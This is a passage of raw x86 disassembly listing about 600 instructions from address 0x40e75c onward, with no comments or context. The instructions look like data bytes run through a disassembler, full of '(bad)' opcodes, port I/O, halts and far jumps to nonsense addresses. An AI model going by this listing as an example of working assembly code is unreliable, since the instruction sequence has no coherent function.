  40e75c:	test   DWORD PTR [ebp+0x53670d0a],esp
  40e762:	and    eax,0x8e87d4a2
  40e767:	pop    ss
  40e768:	push   es
  40e769:	stos   DWORD PTR es:[edi],eax
  40e76a:	fsub   st(7),st
  40e76c:	in     eax,dx
  40e76d:	and    al,0x97
  40e76f:	dec    eax
  40e770:	xor    al,0x86
  40e772:	jnp    0x40e74d
  40e774:	xlat   BYTE PTR ds:[ebx]
  40e775:	adc    BYTE PTR [esi],ch
  40e777:	add    edi,ecx
  40e779:	outs   dx,BYTE PTR ds:[esi]
  40e77a:	test   ebx,ecx
  40e77c:	pop    esi
  40e77d:	push   edi
  40e77e:	mov    ds:0x2c752e76,al
  40e783:	fistp  DWORD PTR [edi+0x619c537e]
  40e789:	scas   eax,DWORD PTR es:[edi]
  40e78a:	test   BYTE PTR [esp+edx*4+0x59621aea],0x55
  40e792:	inc    edx
  40e793:	sub    al,0x53
  40e795:	in     al,0x5e
  40e797:	jp     0x40e7d7
  40e799:	sahf   
  40e79a:	pushf  
  40e79b:	hlt    
  40e79c:	dec    ecx
  40e79d:	cmc    
  40e79e:	retf   
  40e79f:	popa   
  40e7a0:	or     DWORD PTR fs:[eax],edi
  40e7a3:	xchg   cl,ah
  40e7a5:	and    BYTE PTR [edx],ch
  40e7a7:	push   ss
  40e7a8:	jb     0x40e815
  40e7aa:	jo     0x40e7ce
  40e7ac:	and    DWORD PTR [edx+ebp*2-0x4c24b4cf],0xb46b0bfb
  40e7b7:	cmp    eax,0xb5238156
  40e7bc:	adc    eax,0x26ab7430
  40e7c1:	dec    esp
  40e7c2:	add    BYTE PTR [ebp-0x2a2fd6b5],bh
  40e7c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7c9:	sbb    eax,0x4113d1b1
  40e7ce:	das    
  40e7cf:	mov    bl,0x52
  40e7d1:	cmp    dh,BYTE PTR ds:0x59ded8ab
  40e7d7:	daa    
  40e7d8:	fwait
  40e7d9:	and    DWORD PTR [ecx-0x11],esi
  40e7dc:	stos   DWORD PTR es:[edi],eax
  40e7dd:	sub    eax,0xebbf3eba
  40e7e2:	mov    al,0xa5
  40e7e4:	fild   DWORD PTR [esi+0x1c4697c5]
  40e7ea:	sbb    BYTE PTR [ebx+0x63ff1593],bh
  40e7f0:	in     eax,dx
  40e7f1:	jne    0x40e7af
  40e7f3:	adc    esi,edi
  40e7f5:	repnz mov BYTE PTR [edx+eiz*2+0x41a09ab6],cl
  40e7fd:	jbe    0x40e7f7
  40e7ff:	add    eax,0xd4445f1f
  40e804:	xlat   BYTE PTR ds:[ebx]
  40e805:	jb     0x40e7d2
  40e807:	daa    
  40e808:	push   edx
  40e809:	add    dh,BYTE PTR [edi+0x61ae6c10]
  40e80f:	adc    DWORD PTR [eax],0x1b
  40e812:	iret   
  40e813:	and    BYTE PTR [esi+0x8fc4f04],dh
  40e819:	enter  0x3d05,0xb
  40e81d:	pop    esp
  40e81e:	pop    ss
  40e81f:	(bad)  
  40e820:	sub    ebp,DWORD PTR [ecx]
  40e822:	dec    esp
  40e823:	retf   
  40e824:	ins    BYTE PTR es:[edi],dx
  40e825:	jno    0x40e7ba
  40e827:	fdiv   DWORD PTR [ebx+0x66b89ec]
  40e82d:	repnz sbb eax,0x45e05311
  40e833:	xchg   edx,eax
  40e834:	sahf   
  40e835:	xchg   ebp,eax
  40e836:	iret   
  40e837:	je     0x40e87d
  40e839:	test   al,0xc2
  40e83c:	or     esp,esi
  40e83e:	imul   edx,DWORD PTR [ebx+eax*8+0xc62acf0],0x4f0a3d13
  40e849:	in     eax,dx
  40e84a:	dec    edx
  40e84b:	mov    al,ds:0x420673ac
  40e850:	cld    
  40e851:	pop    ebp
  40e852:	aas    
  40e853:	mov    esp,0x1279fc87
  40e858:	push   ebp
  40e859:	sbb    dl,dl
  40e85b:	sbb    BYTE PTR [ebp+0x11],ch
  40e85e:	mov    ah,0xa7
  40e860:	pop    esi
  40e861:	add    al,0x60
  40e863:	retf   0x4096
  40e866:	xor    bl,BYTE PTR ds:0x81e906fe
  40e86c:	rcr    BYTE PTR [ebx-0x54dc655a],1
  40e872:	out    dx,al
  40e873:	icebp  
  40e874:	ret    0x6793
  40e877:	xchg   BYTE PTR [ebx-0x46259c79],ch
  40e87d:	mov    bh,0x56
  40e87f:	dec    ebp
  40e880:	in     eax,dx
  40e881:	xor    eax,0x50b8f525
  40e886:	adc    edi,DWORD PTR [ebp+0xa3be5ad]
  40e88c:	sub    eax,0x6d21e75c
  40e891:	retf   0x6129
  40e894:	mov    esi,0x48748696
  40e899:	inc    esp
  40e89a:	fneni(8087 only) 
  40e89c:	sbb    BYTE PTR [edi],bl
  40e89e:	xchg   DWORD PTR [edx-0x1],esp
  40e8a1:	mov    edx,0x42963d8
  40e8a6:	mov    edx,0x4a2434fc
  40e8ab:	and    edi,ebx
  40e8ad:	(bad)  
  40e8ae:	out    dx,eax
  40e8af:	push   ebx
  40e8b0:	arpl   WORD PTR [edx],sp
  40e8b2:	jge    0x40e8b7
  40e8b4:	lods   eax,DWORD PTR ds:[esi]
  40e8b5:	cmp    ecx,eax
  40e8b7:	or     BYTE PTR [edi],dh
  40e8b9:	(bad)  
  40e8ba:	scas   al,BYTE PTR es:[edi]
  40e8bb:	es inc eax
  40e8bd:	push   edi
  40e8be:	and    esp,eax
  40e8c0:	jmp    0xc55d:0x29d7b113
  40e8c7:	(bad)  
  40e8c8:	pop    esi
  40e8c9:	rol    BYTE PTR [ecx-0x623a98ba],cl
  40e8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8d0:	ss retf 0x943d
  40e8d4:	and    eax,0x9a2fd415
  40e8d9:	inc    ebp
  40e8da:	lock jns 0x40e946
  40e8dd:	es inc ebp
  40e8df:	packssdw mm1,QWORD PTR ds:0x43dc6d0e
  40e8e6:	(bad)  
  40e8e7:	stc    
  40e8e8:	sti    
  40e8e9:	test   eax,0x8ffab78d
  40e8ee:	mov    WORD PTR [edx-0x48956583],cs
  40e8f4:	repz or eax,0xed07b3eb
  40e8fa:	loopne 0x40e95d
  40e8fc:	(bad)  
  40e8fd:	xor    ebp,esi
  40e8ff:	adc    eax,0x48823a29
  40e904:	mov    edx,0xbba9c714
  40e909:	sub    al,BYTE PTR [ebp-0xa0e42f6]
  40e90f:	push   eax
  40e910:	sbb    al,0xe8
  40e912:	jns    0x40e93b
  40e914:	stos   BYTE PTR es:[edi],al
  40e915:	mov    dl,0x2
  40e917:	int3   
  40e918:	ds aam 0xc5
  40e91b:	inc    esp
  40e91c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e91d:	xor    BYTE PTR [eax+edi*2+0x73789416],bl
  40e924:	pop    esp
  40e925:	add    dl,ah
  40e927:	jae    0x40e8b5
  40e929:	sub    DWORD PTR [esp+esi*4],esp
  40e92c:	repnz push edx
  40e92e:	push   0x4bd15612
  40e933:	dec    eax
  40e934:	inc    DWORD PTR ds:0x189292dc
  40e93a:	push   ebp
  40e93b:	jle    0x40e8df
  40e93d:	ss push ds
  40e93f:	psubsw mm6,QWORD PTR [edi]
  40e942:	retf   
  40e943:	daa    
  40e944:	sbb    BYTE PTR [edx],bl
  40e946:	fcom   DWORD PTR [ecx+0x2b5f0dcd]
  40e94c:	cmp    bh,BYTE PTR [eax-0x7f82b0d6]
  40e952:	sbb    edi,0xffffff8f
  40e955:	xchg   BYTE PTR gs:[ecx-0x94de700],ch
  40e95c:	retf   0x46fc
  40e95f:	mov    dl,0xea
  40e961:	mov    ds:0x8dcff707,eax
  40e966:	(bad)  
  40e967:	push   ds
  40e968:	addr16 int3 
  40e96a:	dec    ebp
  40e96b:	rcl    esi,cl
  40e96d:	jae    0x40e9af
  40e96f:	adc    al,0x35
  40e971:	sub    al,0xfb
  40e973:	std    
  40e974:	and    al,0x5c
  40e976:	push   ds
  40e977:	ja     0x40e99c
  40e979:	sti    
  40e97a:	pushf  
  40e97b:	pop    edx
  40e97c:	outs   dx,DWORD PTR ds:[esi]
  40e97d:	sbb    eax,0x6f5b78f3
  40e982:	push   0xa1ea6757
  40e987:	das    
  40e988:	push   ss
  40e989:	std    
  40e98a:	sbb    ecx,ebp
  40e98c:	push   eax
  40e98d:	xchg   esp,eax
  40e98e:	push   0x2a3b6eae
  40e993:	ret    
  40e994:	(bad)  
  40e996:	jae    0x40e918
  40e998:	jb     0x40e9da
  40e99a:	add    al,0x22
  40e99c:	jecxz  0x40e9e2
  40e99e:	xchg   ebx,eax
  40e99f:	sub    al,0xd7
  40e9a1:	cdq    
  40e9a2:	add    ch,bl
  40e9a4:	shr    DWORD PTR [ebp+0x6175235e],cl
  40e9aa:	adc    dl,BYTE PTR [eax-0x46e1a403]
  40e9b0:	inc    edx
  40e9b1:	in     eax,dx
  40e9b2:	sbb    ch,BYTE PTR [edi-0x62b085a7]
  40e9b8:	cli    
  40e9b9:	je     0x40e969
  40e9bb:	cs jle 0x40ea1a
  40e9be:	xchg   esi,eax
  40e9bf:	xchg   ecx,eax
  40e9c0:	inc    esp
  40e9c1:	mov    esi,cs
  40e9c3:	aaa    
  40e9c4:	inc    esi
  40e9c5:	cmp    BYTE PTR [edi],bl
  40e9c7:	es sub eax,ebp
  40e9ca:	out    dx,eax
  40e9cb:	push   es
  40e9cc:	ret    
  40e9cd:	ja     0x40ea48
  40e9cf:	dec    edx
  40e9d0:	mov    WORD PTR [ebx],?
  40e9d2:	jmp    0xf629158b
  40e9d7:	lds    esi,FWORD PTR [esi]
  40e9d9:	ins    DWORD PTR es:[edi],dx
  40e9da:	mov    al,ds:0x8d56b322
  40e9df:	nop
  40e9e0:	cmp    DWORD PTR [edx-0x12da6e9b],ebx
  40e9e6:	push   ds
  40e9e7:	cmp    edi,DWORD PTR [edi-0x166eba84]
  40e9ed:	mov    ebx,0x636a346
  40e9f2:	mov    cl,0xdc
  40e9f4:	add    edi,DWORD PTR [edx-0x1]
  40e9f7:	(bad)  
  40e9f8:	or     al,0x7e
  40e9fa:	pushf  
  40e9fb:	pop    esi
  40e9fc:	mov    bh,dh
  40e9fe:	sbb    dh,cl
  40ea00:	les    ebx,FWORD PTR [eax-0x1e]
  40ea03:	in     eax,0xe3
  40ea05:	adc    esi,0x27
  40ea08:	xchg   esi,eax
  40ea09:	leave  
  40ea0a:	xchg   ebp,eax
  40ea0b:	repz cwde 
  40ea0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea0e:	mul    ecx
  40ea10:	cs call 0x9417efe
  40ea16:	adc    DWORD PTR [esi+0xdb4ae66],0xbf7740d6
  40ea20:	shr    DWORD PTR [esp+ebp*2+0x32],0xe8
  40ea25:	retf   
  40ea26:	push   esp
  40ea27:	leave  
  40ea28:	retf   0xce6a
  40ea2b:	test   eax,0xbf22d71d
  40ea30:	mov    ebp,0xb679cbf0
  40ea35:	sub    BYTE PTR fs:[esi-0x36f9db5c],al
  40ea3c:	mov    dl,0xc7
  40ea3e:	mov    esi,DWORD PTR [ebp+0x52]
  40ea41:	scas   al,BYTE PTR es:[edi]
  40ea42:	sub    ecx,edi
  40ea44:	xchg   dh,bl
  40ea46:	ins    DWORD PTR es:[edi],dx
  40ea47:	lods   eax,DWORD PTR ds:[esi]
  40ea48:	enter  0x3feb,0x65
  40ea4c:	call   0xdd58dd73
  40ea51:	inc    edi
  40ea52:	mov    dh,0x54
  40ea54:	cwde   
  40ea55:	jmp    0xe17d691e
  40ea5a:	or     DWORD PTR ds:0xfb85bf3e,esp
  40ea60:	mov    ebx,0x1757399
  40ea65:	xor    eax,0xd87ea75c
  40ea6a:	adc    ebx,DWORD PTR [ecx+0x7bb19297]
  40ea70:	leave  
  40ea71:	pop    es
  40ea72:	hlt    
  40ea73:	pop    ecx
  40ea74:	outs   dx,BYTE PTR ds:[esi]
  40ea75:	or     DWORD PTR [esi],esi
  40ea77:	pop    ds
  40ea78:	imul   esi,DWORD PTR ds:0x87a7cc07,0xffffffd4
  40ea7f:	mov    esi,gs
  40ea81:	pop    ecx
  40ea82:	xchg   edi,eax
  40ea83:	xchg   esp,eax
  40ea84:	or     bh,BYTE PTR [ebx+eax*8]
  40ea87:	mov    esi,0xb9927d6e
  40ea8c:	sbb    al,BYTE PTR [eax-0x4cb8e5da]
  40ea92:	adc    BYTE PTR [ecx+0x6e],0x6
  40ea96:	xor    BYTE PTR [ebx-0x2b],0x15
  40ea9a:	jmp    0x40eb17
  40ea9c:	shl    DWORD PTR [esp+eiz*4+0x1f],cl
  40eaa0:	fwait
  40eaa1:	adc    BYTE PTR ds:0xd90b9863,0xcc
  40eaa8:	rcr    BYTE PTR [ebp-0xa93f8fe],1
  40eaae:	push   cs
  40eaaf:	lods   eax,DWORD PTR ds:[esi]
  40eab0:	lahf   
  40eab1:	mov    ebx,0xcdf871da
  40eab6:	popa   
  40eab7:	xchg   ecx,eax
  40eab8:	push   edi
  40eab9:	jge    0x40eac8
  40eabb:	call   0xf0d7d3ec
  40eac0:	stc    
  40eac1:	shl    BYTE PTR [edx-0x1d],1
  40eac4:	cmp    eax,0xb5b2fed
  40eac9:	ins    BYTE PTR es:[edi],dx
  40eaca:	dec    esp
  40eacb:	outs   dx,DWORD PTR ds:[esi]
  40eacc:	pushf  
  40eacd:	std    
  40eace:	call   0xebf31dfc
  40ead3:	rcr    bh,1
  40ead5:	(bad)
  40ead9:	push   es
  40eada:	push   esp
  40eadb:	dec    ebp
  40eadc:	mov    bh,0xd3
  40eade:	pop    ecx
  40eadf:	sahf   
  40eae0:	inc    edi
  40eae1:	mov    esi,0x4ae616bd
  40eae6:	scas   eax,DWORD PTR es:[edi]
  40eae7:	in     al,dx
  40eae8:	int    0x3c
  40eaea:	xchg   esi,eax
  40eaeb:	mov    ds:0x1c9b6263,al
  40eaf0:	mov    edx,0x9ecd8a17
  40eaf5:	je     0x40eae1
  40eaf7:	sbb    al,0xef
  40eaf9:	cwde   
  40eafa:	ds cli 
  40eafc:	ss push ss
  40eafe:	adc    BYTE PTR [edi],bh
  40eb00:	push   cs
  40eb01:	sbb    DWORD PTR ss:[edi-0x7ffd405],eax
  40eb08:	add    al,0x28
  40eb0a:	mov    esi,0xe6d23ce4
  40eb0f:	(bad)  
  40eb10:	pusha  
  40eb11:	cld    
  40eb12:	mov    ebx,0xbb7c4e73
  40eb17:	inc    esp
  40eb18:	in     al,0x78
  40eb1a:	test   DWORD PTR [eax],ebx
  40eb1c:	or     al,0xbc
  40eb1e:	adc    esp,DWORD PTR [ebx+0x71624d7b]
  40eb24:	inc    edx
  40eb25:	ja     0x40eab7
  40eb27:	and    BYTE PTR [esi+eax*1+0x3],ch
  40eb2b:	push   es
  40eb2c:	mov    edx,ebp
  40eb2e:	adc    bh,BYTE PTR [ecx]
  40eb30:	enter  0x112,0xb1
  40eb34:	ds ja  0x40eac7
  40eb37:	and    ecx,DWORD PTR [ecx-0x6]
  40eb3a:	mov    edi,0xf12daa06
  40eb3f:	les    eax,FWORD PTR [ecx]
  40eb41:	inc    ebx
  40eb42:	mov    BYTE PTR [ebp+0x1f],al
  40eb45:	fcmovu st,st(7)
  40eb47:	cs jmp 0x40eadf
  40eb4a:	icebp  
  40eb4b:	mov    ebp,0xdfdb3e86
  40eb50:	dec    esp
  40eb51:	and    al,0xe7
  40eb53:	jle    0x40ebb3
  40eb55:	jne    0x40eb97
  40eb57:	xor    dl,BYTE PTR [edi+0x9]
  40eb5a:	or     dh,BYTE PTR [ebp+0x38]
  40eb5d:	pop    edi
  40eb5e:	out    dx,al
  40eb5f:	sbb    DWORD PTR [eax-0xf],esp
  40eb62:	mov    al,0x72
  40eb64:	add    eax,0x15ce0614
  40eb69:	xor    eax,0x630b61b
  40eb6e:	dec    edx
  40eb6f:	lods   al,BYTE PTR ds:[esi]
  40eb71:	not    DWORD PTR [esi]
  40eb73:	cmp    bl,ah
  40eb75:	mov    ch,dh
  40eb77:	jl     0x40eb93
  40eb79:	inc    eax
  40eb7a:	les    ebp,FWORD PTR [ecx+0x4d]
  40eb7d:	lds    esp,FWORD PTR [ebx]
  40eb7f:	jecxz  0x40ebdd
  40eb81:	(bad)  
  40eb82:	mov    al,ds:0xf9a6a9ab
  40eb87:	sub    esp,DWORD PTR [esi+0x8]
  40eb8a:	mov    esi,0x61fc8ae8
  40eb8f:	shl    DWORD PTR [edi],0x12
  40eb92:	nop
  40eb93:	retf   
  40eb94:	inc    ebx
  40eb95:	jmp    0xaddeb0a7
  40eb9a:	cmp    dh,BYTE PTR [eax]
  40eb9c:	cli    
  40eb9d:	shr    bl,1
  40eb9f:	bound  eax,QWORD PTR [ecx+0x32]
  40eba2:	daa    
  40eba3:	inc    edi
  40eba4:	shl    BYTE PTR [ecx-0x6a],1
  40eba7:	mov    edi,0x6de46d2f
  40ebac:	xor    edx,DWORD PTR ds:0xe79a6b9f
  40ebb2:	fsubr  st,st(3)
  40ebb4:	enter  0x6639,0x0
  40ebb8:	(bad)  
  40ebb9:	call   0xd9320fd1
  40ebbe:	inc    esp
  40ebbf:	ja     0x40ec29
  40ebc1:	dec    edi
  40ebc2:	push   edi
  40ebc3:	(bad)  
  40ebc4:	mov    edi,0x929f9bb6
  40ebc9:	mov    cl,0xeb
  40ebcb:	lahf   
  40ebcc:	popa   
  40ebcd:	(bad)  
  40ebce:	mov    edx,0xb9e6b700
  40ebd3:	or     eax,0x45fc5611
  40ebd8:	dec    esp
  40ebd9:	in     eax,0x68
  40ebdb:	test   BYTE PTR [ecx+eiz*4+0x7990118c],ah
  40ebe2:	fs mov cl,bh
  40ebe5:	push   ds
  40ebe6:	push   0x98fd2f71
  40ebeb:	cmp    ah,BYTE PTR [eax-0x58]
  40ebee:	push   0xf4d69c1c
  40ebf3:	jb     0x40eb9e
  40ebf5:	out    0x74,al
  40ebf7:	lea    ecx,[ecx+0x36]
  40ebfa:	mov    dl,0xf6
  40ebfc:	fild   QWORD PTR [eax+0x11]
  40ebff:	popa   
  40ec00:	outs   dx,DWORD PTR ds:[esi]
  40ec01:	in     al,0x8e
  40ec03:	xor    dl,BYTE PTR [ecx+0x68014c5f]
  40ec09:	cmp    al,0x4c
  40ec0b:	push   esi
  40ec0c:	mov    ds:0x11925175,al
  40ec11:	sbb    BYTE PTR [edx],al
  40ec13:	xor    DWORD PTR [eax],eax
  40ec15:	or     bh,BYTE PTR [ebx+0x19f4ed29]
  40ec1b:	mov    al,0xc
  40ec1d:	cwde   
  40ec1e:	popf   
  40ec1f:	inc    eax
  40ec20:	int    0xa2
  40ec22:	push   esp
  40ec23:	xchg   esi,eax
  40ec24:	jns    0x40ec81
  40ec26:	mov    ds:0x824020c2,al
  40ec2b:	xor    BYTE PTR [ecx+0x20],ch
  40ec2e:	imul   ebx,DWORD PTR [ebp+0x44],0xffffff88
  40ec32:	dec    edi
  40ec33:	pop    esp
  40ec34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec35:	bound  eax,QWORD PTR [ecx-0x4b]
  40ec38:	in     eax,dx
  40ec39:	sbb    al,0xe8
  40ec3b:	(bad)  
  40ec3d:	pop    ebp
  40ec3e:	imul   ecx,esi,0x17
  40ec41:	mov    ebp,0x34265c21
  40ec46:	sbb    bh,al
  40ec48:	adc    edx,DWORD PTR [ecx+0x1afdc506]
  40ec4e:	jmp    0xce71a066
  40ec53:	outs   dx,DWORD PTR ds:[esi]
  40ec54:	and    BYTE PTR [esi+0x7f],bh
  40ec57:	push   ecx
  40ec58:	xor    eax,0x80352a14
  40ec5d:	mov    eax,DWORD PTR [ecx]
  40ec5f:	test   BYTE PTR [ebx+0x195009e5],0x3
  40ec66:	cmp    eax,0x91d1c7a9
  40ec6b:	cmp    al,BYTE PTR [esi+0x5b]
  40ec6e:	bound  esi,QWORD PTR [eax+0x6499a491]
  40ec74:	sub    BYTE PTR [ebx],0x27
  40ec77:	cmp    esp,DWORD PTR [eax+0x38203748]
  40ec7d:	push   eax
  40ec7e:	or     eax,0x8b7bb67f
  40ec83:	pop    ecx
  40ec84:	xchg   edx,eax
  40ec85:	and    BYTE PTR [ecx+eiz*1-0x3585df02],dl
  40ec8c:	ret    0x3eea
  40ec8f:	pop    ds
  40ec90:	repnz cmp eax,0x4a195c4b
  40ec96:	loop   0x40ed17
  40ec98:	aaa    
  40ec99:	jl     0x40ec35
  40ec9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec9c:	pushf  
  40ec9d:	out    0xe7,al
  40ec9f:	int3   
  40eca0:	xor    bl,BYTE PTR [edx]
  40eca2:	mov    bh,0x3d
  40eca4:	mov    ch,0xf6
  40eca6:	daa    
  40eca7:	pop    edi
  40eca8:	fild   WORD PTR [edi]
  40ecaa:	aam    0x25
  40ecac:	cmp    eax,0x6854dab1
  40ecb1:	int    0x34
  40ecb3:	mov    ebx,0xa2d7526b
  40ecb8:	call   0x5b086544
  40ecbd:	in     al,dx
  40ecbe:	jno    0x40ed07
  40ecc0:	pop    esi
  40ecc1:	xchg   ebp,eax
  40ecc2:	mov    ecx,0xd7ce7740
  40ecc7:	dec    ecx
  40ecc8:	and    ebx,ebp
  40ecca:	adc    DWORD PTR [ebp-0x3adb4591],eax
  40ecd0:	leave  
  40ecd1:	and    eax,0x32d38e3c
  40ecd6:	jecxz  0x40ed54
  40ecd8:	adc    eax,0x7824abf2
  40ecdd:	ins    DWORD PTR es:[edi],dx
  40ecde:	imul   edx,DWORD PTR ds:0x962f2afa,0xffffff8b
  40ece5:	mov    dl,0x1
  40ece7:	pop    ebp
  40ece8:	sahf   
  40ece9:	jb     0x40ec71
  40eceb:	sbb    al,0x36
  40eced:	jecxz  0x40ed35
  40ecef:	push   esp
  40ecf0:	add    esi,DWORD PTR [edi-0x6571b70a]
  40ecf6:	pop    ecx
  40ecf7:	mov    ah,0xf8
  40ecf9:	push   cs
  40ecfa:	cmp    al,0x69
  40ecfc:	pop    ebp
  40ecfd:	nop
  40ecfe:	mov    esp,0x2a540232
  40ed03:	(bad)  
  40ed04:	pop    ebx
  40ed05:	add    DWORD PTR [ebx+0x3],ebp
  40ed08:	stos   DWORD PTR es:[edi],eax
  40ed09:	jmp    0x66b8:0x9a05db38
  40ed10:	xor    ecx,DWORD PTR [ebp-0x2ababbd9]
  40ed16:	lahf   
  40ed17:	mov    esi,0x9a53fb57
  40ed1c:	imul   edx,DWORD PTR [ecx],0x74
  40ed1f:	add    ebx,DWORD PTR [edx+0x73]
  40ed22:	xor    BYTE PTR [ecx-0x7b5d5062],ch
  40ed28:	popf   
  40ed29:	pop    edi
  40ed2a:	cmp    al,0x26
  40ed2c:	pusha  
  40ed2d:	xor    BYTE PTR [ebx],bl
  40ed2f:	add    al,0x2b
  40ed31:	jg     0x40ed45
  40ed33:	test   al,0xd0
  40ed35:	mov    dl,0xb1
  40ed37:	pop    eax
  40ed38:	mov    dh,BYTE PTR fs:[edi-0x7f]
  40ed3c:	(bad)  
  40ed3d:	pop    ecx
  40ed3e:	push   ebx
  40ed3f:	icebp  
  40ed40:	mov    bh,0x49
  40ed42:	ins    DWORD PTR es:[edi],dx
  40ed43:	pop    ds
  40ed44:	ret    0x348f
  40ed47:	cmp    bl,BYTE PTR [ecx]
  40ed49:	out    dx,al
  40ed4a:	call   0xf4af:0xfba5ef0d
  40ed51:	sub    BYTE PTR [ecx+ebx*8-0x46],al
  40ed55:	fcmovb st,st(3)
  40ed57:	adc    BYTE PTR [edi-0x3dfa218a],bh
  40ed5d:	xlat   BYTE PTR ds:[ebx]
  40ed5e:	mov    edx,0xb5655444
  40ed63:	not    bh
  40ed65:	and    al,0xe5
  40ed67:	push   ebx
  40ed68:	imul   BYTE PTR [ecx+0x0]
  40ed6b:	jle    0x40ed61
  40ed6d:	lods   al,BYTE PTR ds:[esi]
  40ed6e:	jo     0x40ed1f
  40ed70:	imul   ecx,DWORD PTR [edx+0xf13ace0],0x2b
  40ed77:	sti    
  40ed78:	dec    ecx
  40ed79:	mov    bl,0x88
  40ed7b:	bnd ret 0xe3bb
  40ed7f:	cmp    ah,BYTE PTR [ecx]
  40ed81:	dec    ebx
  40ed82:	push   esp
  40ed83:	sbb    dl,BYTE PTR [eax+0x41657ea]
  40ed89:	clc    
  40ed8a:	xchg   edi,eax
  40ed8b:	mov    bh,ch
  40ed8d:	xor    BYTE PTR [ebx],al
  40ed8f:	jl     0x40edd8
  40ed91:	mov    eax,0xdf7d522b
  40ed96:	cmp    ah,ch
  40ed98:	shr    DWORD PTR [edi],1
  40ed9a:	icebp  
  40ed9b:	mov    dh,0x6
  40ed9d:	mov    ds:0x1f4184bc,eax
  40eda2:	sbb    ah,BYTE PTR [esi-0x47ecd41d]
  40eda8:	push   ebp
  40eda9:	das    
  40edaa:	xor    ch,ah
  40edac:	je     0x40ee19
  40edae:	dec    BYTE PTR [ebp+0x3704344b]
  40edb4:	cs iret 
  40edb6:	xchg   ebp,eax
  40edb7:	icebp  
  40edb8:	enter  0xcc04,0x2d
  40edbc:	mov    bl,0x7f
  40edbe:	cmp    eax,0x850b5b4f
  40edc3:	cld    
  40edc4:	nop
  40edc5:	pop    edi
  40edc6:	xor    BYTE PTR [edi+0x6290bcd4],dl
  40edcc:	push   es
  40edcd:	lea    esp,[ecx-0x7]
  40edd0:	sub    bl,BYTE PTR [eax+ebp*8]
  40edd3:	(bad)  
  40edd4:	cld    
  40edd5:	daa    
  40edd6:	mov    dh,0x6e
  40edd8:	repz popf 
  40edda:	dec    edx
  40eddb:	rcr    DWORD PTR ds:0xc20e9f4d,0x39
  40ede2:	mov    dl,0x33
  40ede4:	out    0x5e,al
  40ede6:	and    eax,0xd811435
  40edeb:	jecxz  0x40ee26
  40eded:	mov    ds:0xea08c8bd,eax
  40edf2:	mov    WORD PTR [eax-0x4e06d556],?
  40edf8:	pop    ecx
  40edf9:	push   ds
  40edfa:	hlt    
  40edfb:	inc    edi
  40edfc:	pop    DWORD PTR [edi-0x68aaaa98]
  40ee02:	xchg   ecx,eax
  40ee03:	inc    ebp
  40ee04:	popa   
  40ee05:	gs dec edx
  40ee07:	stos   DWORD PTR es:[edi],eax
  40ee08:	out    0x41,al
  40ee0a:	stc    
  40ee0b:	xor    DWORD PTR [ecx],edi
  40ee0d:	mov    BYTE PTR [esi-0x4f4207c],ah
  40ee13:	(bad)  
  40ee14:	lea    ebp,[edx-0x19c9c1bb]
  40ee1a:	and    eax,0xff60ac8b
  40ee1f:	pop    ebp
  40ee20:	loope  0x40ee2f
  40ee22:	hlt    
  40ee23:	std    
  40ee24:	inc    esp
  40ee25:	je     0x40edb0
  40ee27:	sbb    eax,0x659bb861
  40ee2c:	fiadd  WORD PTR [edi]
  40ee2e:	push   0x158164ec
  40ee33:	arpl   ax,cx
  40ee35:	es xchg esi,eax
  40ee37:	cmp    al,0xe9
  40ee39:	inc    ebx
  40ee3a:	jmp    0x9b67ef52
  40ee3f:	cmp    DWORD PTR [ecx+0x53],0x37c88dba
  40ee46:	in     eax,dx
  40ee47:	stc    
  40ee48:	jnp    0x40ee0d
  40ee4a:	ror    dl,0x1d
  40ee4d:	shl    ecx,1
  40ee4f:	mov    cl,0xc8
  40ee51:	jg     0x40ee47
  40ee53:	pop    eax
  40ee54:	xchg   ebx,eax
  40ee55:	sbb    eax,esp
  40ee57:	rol    esp,cl
  40ee59:	push   ss
  40ee5a:	mov    al,ds:0x942c7412
  40ee5f:	push   esp
  40ee60:	push   edi
  40ee61:	ja     0x40eea3
  40ee63:	out    0xf9,al
  40ee65:	push   esi
  40ee66:	rcl    DWORD PTR [edi],1
  40ee68:	nop
  40ee69:	xchg   ebp,eax
  40ee6a:	imul   ebx,DWORD PTR [esi+edi*2],0xffffffb4
  40ee6e:	rcl    DWORD PTR ds:0x190afffd,1
  40ee74:	and    dl,al
  40ee76:	call   DWORD PTR [eax]
  40ee78:	pusha  
  40ee79:	fisub  DWORD PTR [esi]
  40ee7b:	out    0xd8,al
  40ee7d:	or     BYTE PTR [ebx],0x5f
  40ee80:	mov    WORD PTR [esi],ss
  40ee82:	jno    0x40ee12
  40ee84:	push   ds
  40ee85:	sub    edi,DWORD PTR [ebx-0x90789f]
  40ee8b:	fldcw  WORD PTR [ecx+eiz*2-0x43]
  40ee8f:	sbb    bh,dh
  40ee91:	fldcw  WORD PTR [ecx+0x43]
  40ee94:	cmp    eax,0xc52f66a1
  40ee99:	out    dx,al
  40ee9a:	lds    ebp,FWORD PTR [esi+0x2d3bd7f2]
  40eea0:	xchg   ecx,eax
  40eea1:	jns    0x40ef13
  40eea3:	mov    BYTE PTR [eax-0x22250e48],al
  40eea9:	and    esp,eax
  40eeab:	jne    0x40ee5a
  40eead:	pop    edi
  40eeae:	popa   
  40eeaf:	and    eax,0x5e8f00a
  40eeb4:	fs push ecx
  40eeb6:	sbb    DWORD PTR [edi-0x2025fec8],esp
  40eebc:	or     al,0x42
  40eebe:	dec    edi
  40eebf:	fisub  WORD PTR [ecx]
  40eec1:	test   al,0xa0
  40eec3:	sahf   
  40eec4:	push   edi
  40eec5:	popa   
  40eec6:	pop    edi
  40eec7:	push   esp
  40eec8:	adc    esi,DWORD PTR [ecx+esi*4+0x2a5e2f9f]
  40eecf:	lods   eax,DWORD PTR ds:[esi]
  40eed0:	(bad)  
  40eed1:	lahf   
  40eed2:	inc    ecx
  40eed3:	adc    ebx,0xbdac646c
  40eed9:	cmp    al,0x89
  40eedb:	jl     0x40eec0
  40eedd:	push   esi
  40eede:	fild   DWORD PTR [ebx-0x77]
  40eee1:	sti    
  40eee2:	or     eax,0xb160897d
  40eee7:	popf   
  40eee8:	nop
  40eee9:	aaa    
  40eeea:	mov    bl,0x58
  40eeec:	mov    eax,0x1df1e4b2
  40eef1:	ss nop
  40eef3:	imul   esp,ebx,0xffffff87
